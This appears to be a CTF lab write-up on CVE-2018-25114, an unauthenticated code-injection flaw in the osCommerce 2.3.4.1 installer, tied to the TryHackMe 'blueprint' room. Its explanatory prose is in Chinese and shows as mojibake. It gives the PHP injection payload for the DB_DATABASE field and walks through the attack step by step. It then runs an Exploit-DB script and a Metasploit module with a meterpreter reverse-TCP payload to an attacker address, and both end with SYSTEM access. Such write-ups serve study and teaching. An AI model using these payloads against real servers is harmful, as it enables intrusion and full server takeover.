## CVE-2018-25114
Description  
A remote code execution vulnerability exists within osCommerce Online Merchant version 2.3.4.1 due to insecure default configuration and missing authentication in the installer workflow. By default, the /install/ directory remains accessible after installation. An unauthenticated attacker can invoke install_4.php, submit crafted POST data, and inject arbitrary PHP code into the configure.php file. When the application later includes this file, the injected payload is executed, resulting in full server-side compromise.

## æ¼æ´åˆ†æ
### DIR_FS_DOCUMENT_ROOT
å¯åƒè€ƒ [install_4.php](install_4.php) ä»¥åŠ [exploit.py](exploit.py)
#### 1. **æ¼æ´ä½ç½®**

```php
$file_contents = '<?php' . "\n" .
    '  define(\'HTTP_SERVER\', \'' . $http_server . '\');' . "\n" .
    // ... çœç•¥ä¸­é–“éƒ¨åˆ† ...
    '  define(\'DB_SERVER\', \'' . trim($HTTP_POST_VARS['DB_SERVER']) . '\');' . "\n" .
    '  define(\'DB_SERVER_USERNAME\', \'' . trim($HTTP_POST_VARS['DB_SERVER_USERNAME']) . '\');' . "\n" .
    '  define(\'DB_SERVER_PASSWORD\', \'' . trim($HTTP_POST_VARS['DB_SERVER_PASSWORD']) . '\');' . "\n" .
    '  define(\'DB_DATABASE\', \'' . trim($HTTP_POST_VARS['DB_DATABASE']) . '\');' . "\n" .  // â† æ³¨å…¥é»ï¼
    '  define(\'USE_PCONNECT\', \'false\');' . "\n" .
    '  define(\'STORE_SESSIONS\', \'mysql\');' . "\n";
```

#### 2. **ç‚ºä»€éº¼éœ€è¦ `DIR_FS_DOCUMENT_ROOT`ï¼Ÿ**

çœ‹ï¼š

```php
$dir_fs_document_root = $HTTP_POST_VARS['DIR_FS_DOCUMENT_ROOT'];  // â† é—œéµï¼
if ((substr($dir_fs_document_root, -1) != '\\') && (substr($dir_fs_document_root, -1) != '/')) {
    if (strrpos($dir_fs_document_root, '\\') !== false) {
        $dir_fs_document_root .= '\\';
    } else {
        $dir_fs_document_root .= '/';
    }
}
```

ç„¶å¾Œçœ‹ï¼š

```php
$fp = fopen($dir_fs_document_root . 'includes/configure.php', 'w');  // â† ä½¿ç”¨ DIR_FS_DOCUMENT_ROOT
fputs($fp, $file_contents);
fclose($fp);
```

### ç‚ºä»€éº¼å¿…é ˆæä¾› `DIR_FS_DOCUMENT_ROOT`ï¼Ÿ

#### åŸå›  1: **æ±ºå®šé…ç½®æ–‡ä»¶çš„å¯«å…¥è·¯å¾‘**

```php
// å¦‚æœæ²’æœ‰ DIR_FS_DOCUMENT_ROOT
$dir_fs_document_root = $HTTP_POST_VARS['DIR_FS_DOCUMENT_ROOT'];  // æœƒæ˜¯ NULL æˆ–ç©ºå­—ä¸²

// å˜—è©¦å¯«å…¥æ–‡ä»¶
$fp = fopen($dir_fs_document_root . 'includes/configure.php', 'w');  
// çµæœ: fopen('includes/configure.php', 'w')  
// ç›¸å°è·¯å¾‘ï¼Œå¯èƒ½å¯«å…¥å¤±æ•—æˆ–å¯«åˆ°éŒ¯èª¤ä½ç½®
```

```php
// æä¾› DIR_FS_DOCUMENT_ROOT = "./"
$dir_fs_document_root = "./";

// å˜—è©¦å¯«å…¥æ–‡ä»¶
$fp = fopen('./includes/configure.php', 'w');  
// çµæœ: âœ… æ­£ç¢ºå¯«å…¥åˆ° install/includes/configure.php
```

#### åŸå›  2: **ä»£ç¢¼é‚„æœƒä½¿ç”¨å®ƒæ›´æ–°æ•¸æ“šåº«**

çœ‹ï¼š

```php
osc_db_query('update ' . TABLE_CONFIGURATION . ' set configuration_value = "' . $dir_fs_document_root . 'includes/work/" where configuration_key = "DIR_FS_CACHE"');
osc_db_query('update ' . TABLE_CONFIGURATION . ' set configuration_value = "' . $dir_fs_document_root . 'includes/work/" where configuration_key = "SESSION_WRITE_DIRECTORY"');
```

å¦‚æœ `DIR_FS_DOCUMENT_ROOT` ç‚ºç©ºï¼š
```sql
-- éŒ¯èª¤çš„ SQL
UPDATE configuration SET configuration_value = "includes/work/" WHERE configuration_key = "DIR_FS_CACHE"
-- è·¯å¾‘ä¸å®Œæ•´ï¼
```

å¦‚æœæä¾› `DIR_FS_DOCUMENT_ROOT = "./"`ï¼š
```sql
-- æ­£ç¢ºçš„ SQL
UPDATE configuration SET configuration_value = "./includes/work/" WHERE configuration_key = "DIR_FS_CACHE"
```

#### åŸå›  3: **æ¸…ç†ç·©å­˜æ–‡ä»¶éœ€è¦å®Œæ•´è·¯å¾‘**

çœ‹ï¼š

```php
if ($handle = opendir($dir_fs_document_root . 'includes/work/')) {  // â† éœ€è¦å®Œæ•´è·¯å¾‘
    while (false !== ($filename = readdir($handle))) {
        if (substr($filename, strrpos($filename, '.')) == '.cache') {
            @unlink($dir_fs_document_root . 'includes/work/' . $filename);  // â† éœ€è¦å®Œæ•´è·¯å¾‘
        }
    }
    closedir($handle);
}
```

#### åŸå›  4: **ç®¡ç†å“¡é…ç½®æ–‡ä»¶ä¹Ÿéœ€è¦é€™å€‹è·¯å¾‘**

çœ‹ï¼š

```php
$fp = fopen($dir_fs_document_root . 'admin/includes/configure.php', 'w');  // â† ç¬¬äºŒå€‹é…ç½®æ–‡ä»¶
```

**å¦‚æœæ²’æœ‰æä¾› `DIR_FS_DOCUMENT_ROOT`ï¼Œæ•´å€‹å®‰è£æµç¨‹éƒ½æœƒå¤±æ•—ï¼**

### Exploit ç‚ºä»€éº¼èƒ½æˆåŠŸï¼Ÿ

#### å®Œæ•´æµç¨‹è§£æ

```php
// 1. Exploit ç™¼é€çš„æ•¸æ“š
POST /install/install.php?step=4
{
    "DIR_FS_DOCUMENT_ROOT": "./",           // â† ç¢ºä¿è·¯å¾‘æ­£ç¢º
    "DB_DATABASE": "');passthru('whoami');/*"  // â† æƒ¡æ„ payload
}
```

```php
// 2. PHP è™•ç† 
$dir_fs_document_root = "./";  // âœ… æœ‰å€¼

// 3. è™•ç†è·¯å¾‘ 
// "./" å·²ç¶“æœ‰ "/" çµå°¾ï¼Œä¸åšä¿®æ”¹
$dir_fs_document_root = "./";  // ä¿æŒä¸è®Š

// 4. æ§‹å»ºé…ç½®æ–‡ä»¶å…§å®¹ 
$file_contents = '<?php' . "\n" .
    '  define(\'DB_DATABASE\', \'' . trim("');passthru('whoami');/*") . '\');' . "\n";

// çµæœï¼š
// define('DB_DATABASE', '');passthru('whoami');/*');

// 5. å¯«å…¥æ–‡ä»¶ 
$fp = fopen('./includes/configure.php', 'w');  // âœ… è·¯å¾‘æ­£ç¢º
fputs($fp, $file_contents);
fclose($fp);
```

#### ç”Ÿæˆçš„ configure.php

```php
<?php
  define('HTTP_SERVER', 'http://target.com');
  define('HTTPS_SERVER', 'http://target.com');
  // ... å…¶ä»–æ­£å¸¸é…ç½® ...
  
  define('DB_SERVER', 'localhost');
  define('DB_SERVER_USERNAME', 'root');
  define('DB_SERVER_PASSWORD', 'password');
  define('DB_DATABASE', '');        // â† å­—ä¸²æå‰é—œé–‰
passthru('whoami');                 // â† å‘½ä»¤åŸ·è¡Œï¼
/*');                               // â† é–‹å§‹å¤šè¡Œæ³¨é‡‹
  define('USE_PCONNECT', 'false');  // â† è¢«æ³¨é‡‹æ‰
  define('STORE_SESSIONS', 'mysql');// â† è¢«æ³¨é‡‹æ‰
?>
```

### å¦‚æœä¸æä¾› `DIR_FS_DOCUMENT_ROOT` æœƒç™¼ç”Ÿä»€éº¼ï¼Ÿ

#### æ¸¬è©¦å ´æ™¯ 1ï¼šå®Œå…¨ä¸æä¾›

```python
data = {
    "DB_DATABASE": "');passthru('whoami');/*"
}
```

**çµæœ**ï¼š
```php
// PHP Notice
Notice: Undefined index: DIR_FS_DOCUMENT_ROOT in install_4.php on line 62

// $dir_fs_document_root ç‚º NULL
$fp = fopen('includes/configure.php', 'w');  // å¯èƒ½å¤±æ•—æˆ–å¯«åˆ°éŒ¯èª¤ä½ç½®

// æ•¸æ“šåº«æ›´æ–°å¤±æ•—
osc_db_query('... set configuration_value = "includes/work/" ...');  // ä¸å®Œæ•´çš„è·¯å¾‘
```

#### æ¸¬è©¦å ´æ™¯ 2ï¼šæä¾›ç©ºå­—ä¸²

```python
data = {
    "DIR_FS_DOCUMENT_ROOT": "",
    "DB_DATABASE": "');passthru('whoami');/*"
}
```

**çµæœ**ï¼š
```php
$dir_fs_document_root = "";

// è·¯å¾‘ä¸å®Œæ•´
$fp = fopen('includes/configure.php', 'w');  // ç›¸å°è·¯å¾‘ï¼Œå¯èƒ½å¤±æ•—

// opendir å¤±æ•—
if ($handle = opendir('includes/work/')) {  // Warning: opendir(includes/work/): failed
```

#### æ¸¬è©¦å ´æ™¯ 3ï¼šæä¾›æ­£ç¢ºå€¼

```python
data = {
    "DIR_FS_DOCUMENT_ROOT": "./",
    "DB_DATABASE": "');passthru('whoami');/*"
}
```

**çµæœ**ï¼š
```php
$dir_fs_document_root = "./";

// âœ… æ‰€æœ‰æ“ä½œæˆåŠŸ
fopen('./includes/configure.php', 'w');       // âœ… æˆåŠŸå¯«å…¥
opendir('./includes/work/');                  // âœ… æˆåŠŸæ‰“é–‹
osc_db_query('... "./includes/work/" ...');   // âœ… SQL æ­£ç¢º
```

### ç‚ºä»€éº¼ç”¨ `"./"`ï¼Ÿ

```python
"DIR_FS_DOCUMENT_ROOT": "./"
```

#### `"./"` çš„å«ç¾©

- `.` = ç•¶å‰ç›®éŒ„
- `./` = ç•¶å‰ç›®éŒ„ï¼ˆå¸¶è·¯å¾‘åˆ†éš”ç¬¦ï¼‰

#### ç‚ºä»€éº¼ä¸ç”¨å…¶ä»–å€¼ï¼Ÿ

| å€¼                      | çµæœ               | æ˜¯å¦å¯è¡Œ                 |
| ----------------------- | ------------------ | ------------------------ |
| `""`ï¼ˆç©ºï¼‰              | ç›¸å°è·¯å¾‘ä¸å®Œæ•´     | âŒ å¯èƒ½å¤±æ•—               |
| `"/"`                   | æ ¹ç›®éŒ„ï¼ˆéœ€è¦æ¬Šé™ï¼‰ | âŒ æ¬Šé™ä¸è¶³               |
| `"./"`                  | ç•¶å‰ç›®éŒ„ï¼ˆç›¸å°ï¼‰   | âœ… å®Œç¾                   |
| `"../"`                 | çˆ¶ç›®éŒ„             | âš ï¸ å¯èƒ½æˆåŠŸä½†è·¯å¾‘éŒ¯èª¤     |
| `"C:\\xampp\\htdocs\\"` | çµ•å°è·¯å¾‘           | âš ï¸ å¯è¡Œä½†éœ€è¦çŸ¥é“å®Œæ•´è·¯å¾‘ |

**`"./"`** æ˜¯æœ€å®‰å…¨ã€æœ€é€šç”¨çš„é¸æ“‡ï¼š
- ä¸éœ€è¦çŸ¥é“å®Œæ•´è·¯å¾‘
- åœ¨ä»»ä½•ç³»çµ±ä¸Šéƒ½é©ç”¨ï¼ˆLinux/Windowsï¼‰
- ç›¸å°æ–¼ `install/` ç›®éŒ„æ­£ç¢º

### å®Œæ•´çš„æ”»æ“Šæµç¨‹åœ–

```
[æ”»æ“Šè€…] ç™¼é€ POST è«‹æ±‚
    |
    v
POST /install/install.php?step=4
{
    "DIR_FS_DOCUMENT_ROOT": "./",              â† å¿…é ˆï¼ç¢ºä¿è·¯å¾‘æ“ä½œæˆåŠŸ
    "DB_SERVER": "localhost",                  â† å¯é¸ï¼Œä½†æœ€å¥½æä¾›
    "DB_SERVER_USERNAME": "root",              â† å¯é¸
    "DB_SERVER_PASSWORD": "",                  â† å¯é¸
    "DB_DATABASE": "');passthru('whoami');/*"  â† æƒ¡æ„ payload
}
    |
    v
[install_4.php ] ç²å– DIR_FS_DOCUMENT_ROOT
$dir_fs_document_root = "./";  âœ…
    |
    v
[install_4.php] ä½¿ç”¨è·¯å¾‘æ›´æ–°æ•¸æ“šåº«ã€æ¸…ç†ç·©å­˜  âœ…
    |
    v
[install_4.php] æ§‹å»ºé…ç½®æ–‡ä»¶ï¼Œæ³¨å…¥ payload  âœ…
define('DB_DATABASE', '');passthru('whoami');/*');
    |
    v
[install_4.php] å¯«å…¥ ./includes/configure.php  âœ…
    |
    v
[æ”»æ“Šè€…] è¨ªå• /install/includes/configure.php
    |
    v
[PHP åŸ·è¡Œ] passthru('whoami') è¢«åŸ·è¡Œ  ğŸ¯
    |
    v
[æ”»æ“Šè€…] æ”¶åˆ°å‘½ä»¤åŸ·è¡Œçµæœï¼
```

### ç¸½çµ

**`DIR_FS_DOCUMENT_ROOT` ä¸æ˜¯å¯é¸åƒæ•¸ï¼Œè€Œæ˜¯å¿…é ˆçš„**ï¼ŒåŸå› æ˜¯ï¼š

1. âœ… **ç¢ºå®šé…ç½®æ–‡ä»¶å¯«å…¥ä½ç½®**
2. âœ… **æ•¸æ“šåº«è·¯å¾‘é…ç½®æ­£ç¢º**
3. âœ… **ç·©å­˜æ¸…ç†éœ€è¦å®Œæ•´è·¯å¾‘**ï¼ˆ
4. âœ… **ç®¡ç†å“¡é…ç½®æ–‡ä»¶è·¯å¾‘**
5. âœ… **é¿å… PHP Notice/Warning**
6. âœ… **æé«˜ exploit æˆåŠŸç‡**

æ²’æœ‰å®ƒï¼Œæ•´å€‹å®‰è£æµç¨‹æœƒå› ç‚ºè·¯å¾‘éŒ¯èª¤è€Œå¤±æ•—ï¼Œpayload ä¹Ÿå°±ç„¡æ³•è¢«å¯«å…¥å’ŒåŸ·è¡Œäº†ï¼é€™å°±æ˜¯ç‚ºä»€éº¼ exploit ä»£ç¢¼**å¿…é ˆåŒæ™‚ç™¼é€** `DIR_FS_DOCUMENT_ROOT` å’Œæƒ¡æ„çš„ `DB_DATABASE`ã€‚

## POC

### æ–¹æ³•1 searchsploit
```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/tryhackme/blueprint]
â””â”€$ searchsploit oscommerce 2.3.4        
--------------------------------------------------------- ---------------------------------
 Exploit Title                                           |  Path
--------------------------------------------------------- ---------------------------------
osCommerce 2.3.4 - Multiple Vulnerabilities              | php/webapps/34582.txt
osCommerce 2.3.4.1 - 'currency' SQL Injection            | php/webapps/46328.txt
osCommerce 2.3.4.1 - 'products_id' SQL Injection         | php/webapps/46329.txt
osCommerce 2.3.4.1 - 'reviews_id' SQL Injection          | php/webapps/46330.txt
osCommerce 2.3.4.1 - 'title' Persistent Cross-Site Scrip | php/webapps/49103.txt
osCommerce 2.3.4.1 - Arbitrary File Upload               | php/webapps/43191.py
osCommerce 2.3.4.1 - Remote Code Execution               | php/webapps/44374.py
osCommerce 2.3.4.1 - Remote Code Execution (2)           | php/webapps/50128.py
--------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
```bash          
â”Œâ”€â”€(kaliã‰¿kali)-[~/tryhackme/blueprint]
â””â”€$ python3 /usr/share/exploitdb/exploits/php/webapps/50128.py http://blueprint.thm:8080/oscommerce-2.3.4/catalog
[*] Install directory still available, the host likely vulnerable to the exploit.
[*] Testing injecting system command to test vulnerability
User: nt authority\system

RCE_SHELL$ whoami
nt authority\system
```

### æ–¹æ³•2 msfconsle
```bash
msf6 exploit(multi/http/oscommerce_installer_unauth_code_exec) > show options

Module options (exploit/multi/http/oscommerce_installer_unauth_code_exec):

   Name     Current Setting           Required  Description
   ----     ---------------           --------  -----------
   Proxies                            no        A proxy chain of format type:host:port[,t
                                                ype:host:port][...]. Supported proxies: s
                                                apni, socks4, socks5, socks5h, http
   RHOSTS   blueprint.thm             yes       The target host(s), see https://docs.meta
                                                sploit.com/docs/using-metasploit/basics/u
                                                sing-metasploit.html
   RPORT    8080                      yes       The target port (TCP)
   SSL      false                     no        Negotiate SSL/TLS for outgoing connection
                                                s
   URI      /oscommerce-2.3.4/catalo  yes       The path to the install directory
            g/install/
   VHOST                              no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.4.11.38       yes       The listen address (an interface may be specified)
   LPORT  444              yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   osCommerce 2.3.4.1

meterpreter > getuid
Server username: SYSTEM

```



## åƒè€ƒ
- https://nvd.nist.gov/vuln/detail/CVE-2018-25114
- https://tryhackme.com/room/blueprint